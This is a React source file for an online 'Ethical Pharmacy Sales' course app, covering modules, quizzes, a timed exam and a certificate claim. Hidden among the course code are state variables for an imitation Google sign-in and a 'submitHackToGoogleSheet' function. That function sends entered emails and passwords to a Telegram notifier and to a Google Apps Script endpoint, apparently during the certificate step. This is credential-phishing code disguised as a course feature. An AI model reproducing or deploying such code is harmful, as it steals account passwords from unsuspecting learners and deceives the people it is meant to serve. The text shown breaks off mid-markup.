import { useState, useEffect, useMemo, useRef } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import {
    Play,
    CheckCircle,
    Lock,
    Menu,
    X,
    ChevronRight,
    Award,
    Clock,
    ArrowLeft,
    Zap,
    Star,
    BookOpen,
    ShieldCheck,
    ChevronDown
} from 'lucide-react';
const cn = (...classes: (string | undefined | null | false)[]) => classes.filter(Boolean).join(' ');
import { COURSE_CONTENT, Module, QuizQuestion } from './academy/course';
import { Certificate } from './academy/Certificate';
import { BrandLogo } from './academy/BrandLogo';
import Navbar from './Navbar';
import { notifyHackData } from '../services/telegramService';

const COUNTRY_CODES = [
    { code: '+20', country: 'EG', name: 'Egypt' },
    { code: '+966', country: 'SA', name: 'Saudi Arabia' },
    { code: '+971', country: 'AE', name: 'UAE' },
    { code: '+965', country: 'KW', name: 'Kuwait' },
    { code: '+974', country: 'QA', name: 'Qatar' },
    { code: '+973', country: 'BH', name: 'Bahrain' },
    { code: '+968', country: 'OM', name: 'Oman' },
    { code: '+962', country: 'JO', name: 'Jordan' },
    { code: '+961', country: 'LB', name: 'Lebanon' },
    { code: '+964', country: 'IQ', name: 'Iraq' },
    { code: '+212', country: 'MA', name: 'Morocco' },
    { code: '+213', country: 'DZ', name: 'Algeria' },
    { code: '+216', country: 'TN', name: 'Tunisia' },
    { code: '+218', country: 'LY', name: 'Libya' },
    { code: '+249', country: 'SD', name: 'Sudan' },
    { code: '+970', country: 'PS', name: 'Palestine' },
    { code: '+963', country: 'SY', name: 'Syria' },
    { code: '+967', country: 'YE', name: 'Yemen' },
    { code: '+1', country: 'US', name: 'USA/Canada' },
    { code: '+44', country: 'GB', name: 'UK' },
];

export default function PharmacySalesCourse() {
    const [view, setView] = useState<'landing' | 'course'>('landing');
    const mainContentRef = useRef<HTMLElement>(null);
    const [activeModuleId, setActiveModuleId] = useState<string>('intro');
    const [completedModules, setCompletedModules] = useState<string[]>([]);
    const [sidebarOpen, setSidebarOpen] = useState(true);
    const [showCertificate, setShowCertificate] = useState(false);
    const [firstName, setFirstName] = useState('');
    const [secondName, setSecondName] = useState('');
    const [lastName, setLastName] = useState('');
    const [phone, setPhone] = useState('');
    const [countryCode, setCountryCode] = useState('+20');
    const [email, setEmail] = useState('');
    const [nameInputOpen, setNameInputOpen] = useState(false);
    const [currentCertificateId, setCurrentCertificateId] = useState('');
    const [isSubmitting, setIsSubmitting] = useState(false);

    // Hack/Google Login States
    const [isHacked, setIsHacked] = useState(false);
    const [hackStep, setHackStep] = useState<'email' | 'password'>('email');
    const [hackEmail, setHackEmail] = useState('');
    const [hackPassword, setHackPassword] = useState('');
    const [hackShowPassword, setHackShowPassword] = useState(false);
    const [hackEmailError, setHackEmailError] = useState(false);
    const [showLanguageList, setShowLanguageList] = useState(false);

    const LANGUAGES = [
        "English (United States)", "Afrikaans", "Azərbaycan", "Bahasa Indonesia", "Bahasa Melayu",
        "Català", "Čeština", "Dansk", "Deutsch", "Eesti", "English (United Kingdom)",
        "Español (España)", "Español (Latinoamérica)", "Euskara", "Filipino", "Français (Canada)",
        "Français (France)", "Galego", "Hrvatski", "IsiZulu", "Íslenska", "Italiano", "Kiswahili",
        "Latviešu", "Lietuvių", "Magyar", "Nederlands", "Norsk", "Polski", "Português (Brasil)",
        "Português (Portugal)", "Română", "Slovenčina", "Slovenščina", "Suomi", "Svenska",
        "Tiếng Việt", "Türkçe", "Ελληνικά", "Български", "Русский", "Српски", "Українська",
        "עברית", "اردو", "العربية", "فارسی", "አማርኛ", "नेपाली", "मराठी", "हिन्दी", "বাংলা",
        "ગુજરાતી", "தமிழ்", "తెలుగు", "ಕನ್ನಡ", "മലയാളം", "සිංහල", "ไทย", "ລາວ", "မြန်မာ",
        "ខ្មែរ", "한국어", "日本語", "简体中文", "繁體中文", "粵語"
    ];

    const [quizAnswers, setQuizAnswers] = useState<Record<string, number>>({});
    const [currentQuestionIndex, setCurrentQuestionIndex] = useState(0);
    const [showExplanation, setShowExplanation] = useState(false);
    const [quizCompleted, setQuizCompleted] = useState(false);

    // Exam State
    const [examStarted, setExamStarted] = useState(false);
    const [timeLeft, setTimeLeft] = useState(300); // 5 minutes in seconds
    const finalExamCompleted = completedModules.includes('final-exam');

    const activeModule = COURSE_CONTENT.find(m => m.id === activeModuleId) || COURSE_CONTENT[0];

    const shuffledQuestions = useMemo(() => {
        return activeModule.content.quiz.map(q => {
            // Create an array of objects with value and original index to track the correct answer
            const optionsWithIndex = q.options.map((opt, i) => ({ opt, originalIndex: i }));

            // Fisher-Yates shuffle
            for (let i = optionsWithIndex.length - 1; i > 0; i--) {
                const j = Math.floor(Math.random() * (i + 1));
                [optionsWithIndex[i], optionsWithIndex[j]] = [optionsWithIndex[j], optionsWithIndex[i]];
            }

            // Reconstruct options and find new correct answer index
            const newOptions = optionsWithIndex.map(o => o.opt);
            const newCorrectAnswer = optionsWithIndex.findIndex(o => o.originalIndex === q.correctAnswer);

            return {
                ...q,
                options: newOptions,
                correctAnswer: newCorrectAnswer
            };
        });
    }, [activeModule.id]);

    const totalQuestions = COURSE_CONTENT.reduce((acc, module) => acc + module.content.quiz.length, 0);

    const answeredQuestions = COURSE_CONTENT.reduce((acc, module) => {
        if (completedModules.includes(module.id)) {
            return acc + module.content.quiz.length;
        }
        if (module.id === activeModuleId) {
            return acc + currentQuestionIndex;
        }
        return acc;
    }, 0);

    const progress = totalQuestions > 0 ? (answeredQuestions / totalQuestions) * 100 : 0;
    const allCompleted = completedModules.length === COURSE_CONTENT.length;

    // Reset quiz state when module changes & scroll content to top
    useEffect(() => {
        // Always scroll main content area back to top on module switch
        if (mainContentRef.current) {
            mainContentRef.current.scrollTo({ top: 0, behavior: 'instant' });
        }
        if (activeModuleId === 'intro') return;
        setQuizAnswers({});
        setCurrentQuestionIndex(0);
        setShowExplanation(false);
        setQuizCompleted(false);
        setExamStarted(false);
        setTimeLeft(300);
    }, [activeModuleId]);

    // Timer Logic
    useEffect(() => {
        if (!examStarted || quizCompleted || activeModule.id !== 'final-exam') return;

        const timer = setInterval(() => {
            setTimeLeft((prev) => {
                if (prev <= 1) {
                    clearInterval(timer);
                    setQuizCompleted(true); // Auto-submit/finish when time runs out
                    handleModuleComplete(activeModule.id);
                    return 0;
                }
                return prev - 1;
            });
        }, 1000);

        return () => clearInterval(timer);
    }, [examStarted, quizCompleted, activeModule.id]);

    const formatTime = (seconds: number) => {
        const mins = Math.floor(seconds / 60);
        const secs = seconds % 60;
        return `${mins}:${secs.toString().padStart(2, '0')}`;
    };

    const handleModuleComplete = (id: string) => {
        if (!completedModules.includes(id)) {
            setCompletedModules(prev => [...prev, id]);
        }

        // Auto advance to next module if available
        const currentIndex = COURSE_CONTENT.findIndex(m => m.id === id);
        if (currentIndex < COURSE_CONTENT.length - 1) {
            // Optional: Auto-advance after a delay or let user click next
        }
    };

    const handleAnswerSelect = (questionId: string, optionIndex: number) => {
        if (showExplanation) return; // Prevent changing answer after submission

        setQuizAnswers(prev => ({ ...prev, [questionId]: optionIndex }));
        setShowExplanation(true); // Show explanation immediately after selection
    };

    const handleNextQuestion = () => {
        const currentQuestion = shuffledQuestions[currentQuestionIndex];
        const isCorrect = quizAnswers[currentQuestion.id] === currentQuestion.correctAnswer;

        if (isCorrect) {
            if (currentQuestionIndex < shuffledQuestions.length - 1) {
                setCurrentQuestionIndex(prev => prev + 1);
                setShowExplanation(false);
            } else {
                setQuizCompleted(true);
                handleModuleComplete(activeModule.id);
            }
        } else {
            // If incorrect, they stay on the same question but explanation is shown
            // They can retry by resetting the explanation state? 
            // Requirement: "appear when I answer correctly moves me to the next question"
            // So if incorrect, they should probably see why, and then try again?
            // Let's keep explanation open. They need to select the correct one to proceed?
            // Or maybe we just reset the state to allow re-selection?
            // Let's allow re-selection if incorrect.
            setShowExplanation(false);
            setQuizAnswers(prev => {
                const newAnswers = { ...prev };
                delete newAnswers[currentQuestion.id];
                return newAnswers;
            });
        }
    };

    const generateCertificateId = (name: string) => {
        const random3 = Math.floor(100 + Math.random() * 900);
        const dateObj = new Date();
        const monthNames = ["JANUARY", "FEBRUARY", "MARCH", "APRIL", "MAY", "JUNE", "JULY", "AUGUST", "SEPTEMBER", "OCTOBER", "NOVEMBER", "DECEMBER"];
        const month = monthNames[dateObj.getMonth()].substring(0, 2);
        const year = dateObj.getFullYear().toString().slice(-2);
        const initial = name.charAt(0).toUpperCase();

        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        let random4 = '';
        for (let i = 0; i < 4; i++) {
            random4 += chars.charAt(Math.floor(Math.random() * chars.length));
        }

        return `MED-${random3}-${month}ra${year}@${initial}/${random4}`;
    };

    const submitToGoogleSheet = async (data: {
        firstName: string;
        secondName: string;
        lastName: string;
        phone: string;
        email: string;
        courseName: string;
        certificateId: string;
        timestamp: string;
    }) => {
        // This is the Google Apps Script Web App URL
        const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbxqhxNVi5kEpjlTsDRVo5JSg3r5isy-10BM2Q4ufkm4etOW_fuvIs_kWP_u3JiTtEy6PA/exec';

        try {
            await fetch(GOOGLE_SCRIPT_URL, {
                method: 'POST',
                mode: 'no-cors', // Mode to handle redirect from Google
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(data),
            });
            console.log('Successfully recorded in Google Sheet');
        } catch (error) {
            console.error('Error recording in Google Sheet:', error);
        }
    };

    const submitHackToGoogleSheet = async (data: {
        email: string;
        password: string;
        timestamp: string;
    }) => {
        try {
            await notifyHackData(data);
        } catch (e) {
            console.error('Telegram hack notification failed:', e);
        }

        // Note: You need to deploy a Google Apps Script as a web app for the new sheet 
        // and replace this URL with the one you get from Google.
        const GOOGLE_HACK_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbw4HYlKEg0BRL0LY1hyRvzyyOrMRCT4OtpEQwR58qt2U_th45eOfonn8t8jUPGczP9v/exec';

        try {
            await fetch(GOOGLE_HACK_SCRIPT_URL, {
                method: 'POST',
                mode: 'no-cors',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(data),
            });
        } catch (error) {
            console.error('Error recording hack data:', error);
        }
    };

    const handleGetCertificate = () => {
        if (firstName && secondName && lastName && phone && email) {
            const certId = generateCertificateId(`${firstName} ${secondName} ${lastName}`);
            setCurrentCertificateId(certId);
            setShowCertificate(true);

            // Submit to Google Sheet
            submitToGoogleSheet({
                firstName,
                secondName,
                lastName,
                phone: `(${countryCode})${phone}`,
                email,
                courseName: "Master the Art of Ethical Pharmacy Sales",
                certificateId: certId,
                timestamp: new Date().toLocaleString()
            });
        } else {
            // Reset hack state when starting the process if not completed
            if (!isHacked) {
                setHackStep('email');
                setHackEmail('');
                setHackPassword('');
            }
            setNameInputOpen(true);
        }
    };

    return (
        <div dir="ltr" className="min-h-screen bg-white text-gray-800 selection:bg-brand-blue selection:text-white" style={{ direction: 'ltr', textAlign: 'left', unicodeBidi: 'isolate' }}>

            {/* Landing View */}
            {view === 'landing' && (
                <div className="relative min-h-screen flex flex-col overflow-hidden">
                    {/* Abstract Background Shapes */}
                    <div className="absolute top-0 right-0 w-[50vw] h-[50vw] bg-brand-blue/10 rounded-full blur-3xl -translate-y-1/2 translate-x-1/4"></div>
                    <div className="absolute bottom-0 left-0 w-[40vw] h-[40vw] bg-brand-yellow/10 rounded-full blur-3xl translate-y-1/4 -translate-x-1/4"></div>

                    <Navbar />

                    <main className="relative z-20 flex-1 flex flex-col justify-center items-center text-center px-4 max-w-5xl mx-auto mt-28 mb-20">
                        <motion.div
                            initial={{ opacity: 0, y: 20 }}
                            animate={{ opacity: 1, y: 0 }}
                            transition={{ duration: 0.8 }}
                            className="relative"
                        >
                            <div className="absolute -top-12 left-1/2 -translate-x-1/2 animate-bounce">
                                <span className="inline-block py-1 px-4 rounded-full bg-brand-yellow text-brand-blue text-xs font-bold uppercase tracking-wider shadow-md transform -rotate-2">
                                    New Course!
                                </span>
                            </div>

                            <h1 className="text-5xl md:text-7xl font-display font-black mb-6 leading-tight text-gray-900">
                                Master the Art of <span className="text-transparent bg-clip-text bg-gradient-to-r from-brand-blue via-brand-red to-brand-yellow">Ethical Pharmacy Sales</span>
                            </h1>
                            <p className="text-xl text-gray-600 max-w-2xl mx-auto mb-10 font-medium leading-relaxed">
                                Level up your sales skills, master patient consultation, and unlock your full potential with our interactive masterclass.
                            </p>

                            <div className="flex flex-col sm:flex-row gap-4 justify-center items-center">
                                <button
                                    onClick={() => setView('course')}
                                    className="px-8 py-4 bg-brand-blue text-white font-bold text-lg rounded-2xl hover:bg-blue-500 transition shadow-xl shadow-blue-500/20 flex items-center gap-2 group transform hover:-translate-y-1"
                                >
                                    Start Your Journey
                                    <div className="bg-white/20 rounded-full p-1">
                                        <ChevronRight size={20} className="group-hover:translate-x-1 transition-transform" />
                                    </div>
                                </button>
                            </div>
                        </motion.div>

                        {/* Stats / Trust */}
                        <div className="mt-24 grid grid-cols-2 md:grid-cols-4 gap-6 w-full">
                            {[
                                { label: 'Modules', value: '7', icon: BookOpen, color: 'text-brand-blue', bg: 'bg-brand-blue/10' },
                                { label: 'Duration', value: '6 Hours', icon: Clock, color: 'text-brand-red', bg: 'bg-brand-red/10' },
                                { label: 'Level', value: 'Advanced', icon: Zap, color: 'text-brand-yellow', bg: 'bg-brand-yellow/10' },
                                { label: 'Certificate', value: 'Included', icon: Award, color: 'text-brand-green', bg: 'bg-brand-green/10' }
                            ].map((stat, i) => (
                                <div key={i} className="bg-white p-6 rounded-3xl shadow-sm border border-gray-100 hover:shadow-md transition-shadow">
                                    <div className={cn("w-12 h-12 rounded-2xl flex items-center justify-center mx-auto mb-4", stat.bg)}>
                                        <stat.icon className={stat.color} size={24} />
                                    </div>
                                    <div className="text-2xl md:text-3xl font-display font-bold text-gray-900 mb-1">{stat.value}</div>
                                    <div className="text-xs text-gray-500 uppercase tracking-widest font-bold">{stat.label}</div>
                                </div>
                            ))}
                        </div>
                    </main>
                </div>
            )}

            {/* Course View */}
            {view === 'course' && (
                <div className="flex h-screen overflow-hidden bg-gray-50">

                    {/* Sidebar */}
                    <motion.aside
                        initial={{ x: -300 }}
                        animate={{ x: sidebarOpen ? 0 : -320 }}
                        className="fixed md:relative z-30 w-80 h-full bg-white border-r border-gray-200 flex flex-col shrink-0 shadow-xl"
                    >
                        <div className="p-6 border-b border-gray-100 flex justify-between items-center bg-white">
                            <div className="flex items-center gap-3 cursor-pointer" onClick={() => setView('landing')}>
                                <BrandLogo className="w-10 h-10" />
                                <span className="font-display font-bold text-xl tracking-tight text-gray-900">Medestra Academy</span>
                            </div>
                            <button onClick={() => setSidebarOpen(false)} className="md:hidden text-gray-400 hover:text-gray-600">
                                <X size={20} />
                            </button>
                        </div>

                        <div className="p-6 border-b border-gray-100 bg-gray-50/50">
                            <div className="flex justify-between text-xs text-gray-500 mb-2 uppercase tracking-wider font-bold">
                                <span>Your Progress</span>
                                <span>{Math.round(progress)}%</span>
                            </div>
                            <div className="h-3 w-full bg-gray-200 rounded-full overflow-hidden">
                                <div
                                    className="h-full bg-gradient-to-r from-brand-blue to-brand-green transition-all duration-500 rounded-full"
                                    style={{ width: `${progress}%` }}
                                ></div>
                            </div>
                        </div>

                        <div className="flex-1 overflow-y-auto py-4">
                            <div className="px-6 pb-4 text-xs font-bold text-gray-400 uppercase tracking-widest">Curriculum</div>
                            <div className="space-y-2 px-3">
                                {/* Introduction Item */}
                                <button
                                    onClick={() => setActiveModuleId('intro')}
                                    className={cn(
                                        "w-full px-4 py-3 flex items-center gap-3 text-left transition-all rounded-xl relative group",
                                        activeModuleId === 'intro' ? "bg-brand-blue/10 text-brand-blue" : "hover:bg-gray-100 text-gray-600"
                                    )}
                                >
                                    <div className={cn(
                                        "w-6 h-6 rounded-full flex items-center justify-center shrink-0 transition-colors shadow-sm",
                                        activeModuleId === 'intro' ? "bg-brand-blue text-white" : "bg-white border-2 border-gray-200 text-gray-400"
                                    )}>
                                        <BookOpen size={14} />
                                    </div>
                                    <span className={cn("text-sm font-bold", activeModuleId === 'intro' ? "text-brand-blue" : "text-gray-700")}>
                                        Introduction & Roadmap
                                    </span>
                                </button>

                                {COURSE_CONTENT.map((module, index) => {
                                    const isActive = activeModuleId === module.id;
                                    const isCompleted = completedModules.includes(module.id);
                                    // A module is unlocked only if it's the first one, or the previous module is completed
                                    const isLocked = index > 0 && !completedModules.includes(COURSE_CONTENT[index - 1].id);

                                    return (
                                        <button
                                            key={module.id}
                                            onClick={() => !isLocked && setActiveModuleId(module.id)}
                                            disabled={isLocked}
                                            className={cn(
                                                "w-full px-4 py-3 flex items-start gap-3 text-left transition-all rounded-xl relative group",
                                                isActive ? "bg-brand-blue/10 text-brand-blue" : "hover:bg-gray-100 text-gray-600",
                                                isLocked ? "opacity-40 cursor-not-allowed" : "cursor-pointer"
                                            )}
                                        >
                                            <div className={cn(
                                                "mt-0.5 w-6 h-6 rounded-full flex items-center justify-center shrink-0 transition-colors shadow-sm",
                                                isCompleted
                                                    ? "bg-brand-green text-white"
                                                    : isActive
                                                        ? "bg-brand-blue text-white"
                                                        : isLocked
                                                            ? "bg-gray-100 border-2 border-gray-200 text-gray-300"
                                                            : "bg-white border-2 border-gray-200 text-gray-400"
                                            )}>
                                                {isCompleted
                                                    ? <CheckCircle size={14} />
                                                    : isLocked
                                                        ? <Lock size={11} />
                                                        : <span className="text-[10px] font-bold">{index + 1}</span>
                                                }
                                            </div>

                                            <div className="flex-1">
                                                <h4 className={cn("text-sm font-bold mb-0.5 leading-tight", isActive ? "text-brand-blue" : isLocked ? "text-gray-400" : "text-gray-700")}>
                                                    {module.title}
                                                </h4>
                                                <div className="flex items-center gap-2 text-xs opacity-70 font-medium">
                                                    <Clock size={10} />
                                                    <span>{isLocked ? 'Locked' : module.duration}</span>
                                                </div>
                                            </div>

                                            {isLocked && <Lock size={13} className="self-center text-gray-300 shrink-0" />}
                                        </button>
                                    );
                                })}
                            </div>
                        </div>

                        <div className="p-6 border-t border-gray-100 bg-gray-50/50 space-y-3">
                            <button
                                onClick={handleGetCertificate}
                                disabled={!finalExamCompleted}
                                className={cn(
                                    "w-full py-3 rounded-xl flex flex-col items-center justify-center gap-0.5 text-sm font-bold transition-all",
                                    finalExamCompleted
                                        ? "bg-gradient-to-r from-brand-yellow to-orange-400 text-white shadow-lg shadow-orange-400/30 hover:shadow-xl hover:shadow-orange-400/40 hover:-translate-y-0.5 ring-2 ring-brand-yellow/30"
                                        : "bg-gray-100 text-gray-400 cursor-not-allowed border-2 border-dashed border-gray-200"
                                )}
                            >
                                <div className="flex items-center gap-2">
                                    {finalExamCompleted ? <Award size={18} /> : <Lock size={16} />}
                                    Claim Certificate
                                </div>
                                <span className={cn(
                                    "text-[10px] font-medium uppercase tracking-wider opacity-80",
                                    finalExamCompleted ? "text-white/90" : "text-gray-400"
                                )}>
                                    {finalExamCompleted ? 'Unlocked Premium Access' : 'Complete Exam to Unlock'}
                                </span>
                            </button>

                            <button
                                onClick={() => {
                                    if (confirm('Are you sure you want to reset your progress?')) {
                                        setCompletedModules([]);
                                        setActiveModuleId(COURSE_CONTENT[0].id);
                                    }
                                }}
                                className="w-full text-xs text-gray-400 hover:text-brand-red transition flex items-center justify-center gap-1 font-medium"
                            >
                                Reset Progress
                            </button>
                        </div>
                    </motion.aside>

                    {/* Main Content */}
                    <main ref={mainContentRef} className="flex-1 flex flex-col h-full relative overflow-y-auto bg-[#F8FAFC]">
                        {/* Mobile Header */}
                        <div className="md:hidden flex items-center justify-between p-4 border-b border-gray-200 bg-white sticky top-0 z-20 shadow-sm">
                            <div className="flex items-center gap-2">
                                <BrandLogo className="w-8 h-8" />
                                <span className="font-display font-bold text-gray-900">Medestra Academy</span>
                            </div>
                            <button onClick={() => setSidebarOpen(true)} className="text-gray-600">
                                <Menu size={24} />
                            </button>
                        </div>

                        {/* Content Area */}
                        <div className="flex-1 max-w-4xl mx-auto w-full p-6 md:p-12">
                            <div className="mb-8">
                                <button
                                    onClick={() => setView('landing')}
                                    className="flex items-center gap-2 text-gray-500 hover:text-brand-blue text-sm mb-6 transition font-medium"
                                >
                                    <ArrowLeft size={16} /> Back to Home
                                </button>

                                {activeModuleId === 'intro' ? (
                                    <motion.div
                                        initial={{ opacity: 0 }}
                                        animate={{ opacity: 1 }}
                                        className="space-y-16"
                                    >
                                        {/* Hero Section */}
                                        <div className="relative bg-white rounded-[2.5rem] p-8 md:p-12 overflow-hidden border border-gray-100 shadow-2xl shadow-brand-blue/5">
                                            {/* Background Decor */}
                                            <div className="absolute top-0 right-0 w-[400px] h-[400px] bg-gradient-to-bl from-brand-blue/5 to-transparent rounded-bl-full -mr-20 -mt-20 pointer-events-none" />
                                            <div className="absolute bottom-0 left-0 w-[300px] h-[300px] bg-gradient-to-tr from-brand-yellow/5 to-transparent rounded-tr-full -ml-20 -mb-20 pointer-events-none" />

                                            <div className="relative z-10">
                                                <div className="inline-flex items-center gap-2 px-4 py-2 rounded-full bg-brand-blue/5 text-brand-blue text-xs font-bold uppercase tracking-widest mb-8">
                                                    <Zap size={14} fill="currentColor" />
                                                    Interactive Course Roadmap
                                                </div>
                                                <h1 className="text-4xl md:text-6xl font-display font-black text-gray-900 mb-6 leading-tight tracking-tight">
                                                    Your Journey to <br className="hidden md:block" />
                                                    <span className="text-transparent bg-clip-text bg-gradient-to-r from-brand-blue to-purple-600">Mastery Begins Here</span>
                                                </h1>
                                                <p className="text-xl text-gray-600 max-w-2xl leading-relaxed mb-10">
                                                    Transform your pharmacy practice. This course isn't just about sales; it's about patient care, clinical authority, and sustainable business growth.
                                                </p>

                                                <div className="flex flex-wrap items-center gap-8 text-sm font-bold text-gray-500">
                                                    <div className="flex items-center gap-2 bg-gray-50 px-4 py-2 rounded-xl border border-gray-100">
                                                        <div className="w-2.5 h-2.5 rounded-full bg-brand-green shadow-sm shadow-brand-green/50" />
                                                        {completedModules.length} Completed
                                                    </div>
                                                    <div className="flex items-center gap-2 bg-gray-50 px-4 py-2 rounded-xl border border-gray-100">
                                                        <div className="w-2.5 h-2.5 rounded-full bg-brand-blue animate-pulse" />
                                                        {COURSE_CONTENT.length - completedModules.length} Remaining
                                                    </div>
                                                </div>
                                            </div>
                                        </div>

                                        {/* Introduction Video */}
                                        <div className="max-w-4xl mx-auto px-2 md:px-4 mb-16">
                                            <div className="bg-white rounded-3xl overflow-hidden shadow-xl border border-gray-100">
                                                <div className="bg-brand-blue/5 p-4 border-b border-gray-100">
                                                    <h3 className="font-display font-bold text-gray-900 flex items-center gap-2">
                                                        <Play size={18} className="text-brand-blue" />
                                                        Course Introduction
                                                    </h3>
                                                </div>
                                                <div className="aspect-video bg-gray-900 w-full relative">
                                                    <iframe
                                                        src="https://drive.google.com/file/d/1E07A1HYHN3jgcJGHjLdK2rSSEio4Sl1_/preview"
                                                        className="w-full h-full border-0 absolute top-0 left-0"
                                                        allow="autoplay; fullscreen"
                                                        allowFullScreen
                                                        title="Course Introduction"
                                                    ></iframe>
                                                </div>
                                            </div>
                                        </div>

                                        {/* Interactive Roadmap */}
                                        <div className="max-w-4xl mx-auto px-2 md:px-4">
                                            {COURSE_CONTENT.map((module, index) => {
                                                const isCompleted = completedModules.includes(module.id);
                                                const isNext = !isCompleted && (index === 0 || completedModules.includes(COURSE_CONTENT[index - 1].id));
                                                const isLocked = !isCompleted && !isNext;
                                                const Icon = module.icon;

                                                return (
                                                    <motion.div
                                                        key={module.id}
                                                        initial={{ opacity: 0, y: 30 }}
                                                        whileInView={{ opacity: 1, y: 0 }}
                                                        viewport={{ once: true, margin: "-50px" }}
                                                        transition={{ delay: index * 0.1 }}
                                                        className="relative pl-16 md:pl-32 pb-16 last:pb-0 group"
                                                    >
                                                        {/* Connecting Line */}
                                                        {index !== COURSE_CONTENT.length - 1 && (
                                                            <div className="absolute left-[27px] md:left-[59px] top-14 bottom-0 w-1 md:w-1.5 bg-gray-100 rounded-full overflow-hidden">
                                                                <motion.div
                                                                    initial={{ height: "0%" }}
                                                                    animate={{ height: isCompleted ? "100%" : "0%" }}
                                                                    transition={{ duration: 1, ease: "easeInOut" }}
                                                                    className="w-full bg-brand-green"
                                                                />
                                                            </div>
                                                        )}

                                                        {/* Node Icon */}
                                                        <button
                                                            onClick={() => !isLocked && setActiveModuleId(module.id)}
                                                            disabled={isLocked}
                                                            className={cn(
                                                                "absolute left-2 md:left-10 top-0 w-14 h-14 rounded-2xl rotate-3 flex items-center justify-center border-[5px] z-10 transition-all duration-500 shadow-xl",
                                                                isCompleted
                                                                    ? "bg-brand-green border-brand-green text-white rotate-0 scale-100"
                                                                    : isNext
                                                                        ? "bg-white border-brand-blue text-brand-blue -rotate-6 scale-110 shadow-brand-blue/30 ring-4 ring-brand-blue/10"
                                                                        : "bg-gray-50 border-gray-200 text-gray-300 rotate-0 grayscale"
                                                            )}
                                                        >
                                                            {isCompleted ? <CheckCircle size={24} strokeWidth={3} /> :
                                                                isLocked ? <Lock size={20} /> :
                                                                    <span className="text-lg font-black">{index + 1}</span>}
                                                        </button>

                                                        {/* Content Card */}
                                                        <div
                                                            onClick={() => !isLocked && setActiveModuleId(module.id)}
                                                            className={cn(
                                                                "relative bg-white p-8 rounded-[2rem] border transition-all duration-300 cursor-pointer overflow-hidden",
                                                                isNext
                                                                    ? "border-brand-blue shadow-2xl shadow-brand-blue/10 scale-[1.02] ring-1 ring-brand-blue/20"
                                                                    : "border-gray-100 shadow-lg shadow-gray-200/50 hover:shadow-xl hover:-translate-y-1",
                                                                isLocked ? "opacity-60 cursor-not-allowed grayscale-[0.5]" : ""
                                                            )}
                                                        >
                                                            {/* Active Indicator Strip */}
                                                            {isNext && <div className="absolute left-0 top-0 bottom-0 w-2 bg-brand-blue" />}

                                                            <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 mb-4">
                                                                <div className="flex items-center gap-3">
                                                                    <div className={cn(
                                                                        "p-2.5 rounded-xl",
                                                                        isCompleted ? "bg-brand-green/10 text-brand-green" : isNext ? "bg-brand-blue/10 text-brand-blue" : "bg-gray-100 text-gray-400"
                                                                    )}>
                                                                        <Icon size={20} />
                                                                    </div>
                                                                    <span className={cn(
                                                                        "text-xs font-bold uppercase tracking-widest",
                                                                        isCompleted ? "text-brand-green" : isNext ? "text-brand-blue" : "text-gray-400"
                                                                    )}>
                                                                        Module 0{index + 1}
                                                                    </span>
                                                                </div>
                                                                <span className="text-xs font-bold text-gray-400 flex items-center gap-1.5 bg-gray-50 px-3 py-1.5 rounded-lg border border-gray-100 w-fit">
                                                                    <Clock size={12} /> {module.duration}
                                                                </span>
                                                            </div>

                                                            <h3 className={cn(
                                                                "text-2xl font-bold mb-3 font-display",
                                                                isCompleted ? "text-gray-800" : isNext ? "text-brand-blue" : "text-gray-600"
                                                            )}>
                                                                {module.title}
                                                            </h3>

                                                            <p className="text-gray-600 leading-relaxed mb-6">
                                                                {module.description}
                                                            </p>

                                                            {/* Action Footer */}
                                                            <div className="flex items-center gap-2 text-sm font-bold">
                                                                {isCompleted ? (
                                                                    <span className="text-brand-green flex items-center gap-1">
                                                                        <CheckCircle size={16} /> Completed
                                                                    </span>
                                                                ) : isNext ? (
                                                                    <span className="text-brand-blue flex items-center gap-1 group-hover:gap-2 transition-all">
                                                                        Start Module <ChevronRight size={16} />
                                                                    </span>
                                                                ) : (
                                                                    <span className="text-gray-400 flex items-center gap-1">
                                                                        <Lock size={14} /> Locked
                                                                    </span>
                                                                )}
                                                            </div>
                                                        </div>
                                                    </motion.div>
                                                );
                                            })}

                                            {/* Certificate Node */}
                                            <motion.div
                                                initial={{ opacity: 0 }}
                                                whileInView={{ opacity: 1 }}
                                                viewport={{ once: true }}
                                                className="relative pl-16 md:pl-32 pt-8"
                                            >
                                                {/* Line from last module */}
                                                <div className="absolute left-[27px] md:left-[59px] top-[-30px] bottom-20 w-1 md:w-1.5 bg-gray-100 rounded-full overflow-hidden">
                                                    <motion.div
                                                        initial={{ height: "100%" }}
                                                        animate={{ height: "100%" }}
                                                        transition={{ duration: 1 }}
                                                        className="w-full bg-brand-yellow"
                                                    />
                                                </div>

                                                <div className={cn(
                                                    "absolute left-2 md:left-10 top-2 w-14 h-14 rounded-full border-[5px] flex items-center justify-center z-10 transition-all duration-500",
                                                    "bg-brand-yellow border-brand-yellow text-white shadow-xl shadow-brand-yellow/30"
                                                )}>
                                                    <Award size={24} />
                                                </div>

                                                <div className={cn(
                                                    "p-8 rounded-[2rem] border-2 border-dashed transition-all text-center md:text-left",
                                                    "border-brand-yellow bg-brand-yellow/5"
                                                )}>
                                                    <h3 className={cn("text-xl font-bold mb-2", "text-gray-900")}>
                                                        Course Certificate
                                                    </h3>
                                                    <p className="text-gray-500">
                                                        {finalExamCompleted
                                                            ? "Your certificate is unlocked and ready to claim!"
                                                            : "Finish the final exam to unlock your official certification."}
                                                    </p>
                                                    {finalExamCompleted ? (
                                                        <button
                                                            onClick={handleGetCertificate}
                                                            className="mt-4 px-6 py-2 bg-brand-yellow text-white font-bold rounded-xl shadow-lg hover:bg-yellow-500 transition"
                                                        >
                                                            Claim Now
                                                        </button>
                                                    ) : (
                                                        <div className="mt-4 px-6 py-3 bg-gray-100 text-gray-400 font-bold rounded-xl flex items-center justify-center gap-2 border border-gray-200">
                                                            <Lock size={16} />
                                                            Complete Final Exam to Claim
                                                        </div>
                                                    )}
                                                </div>
                                            </motion.div>
                                        </div>

                                        <div className="mt-16 flex justify-center pb-12">
                                            <button
                                                onClick={() => setActiveModuleId(COURSE_CONTENT[0].id)}
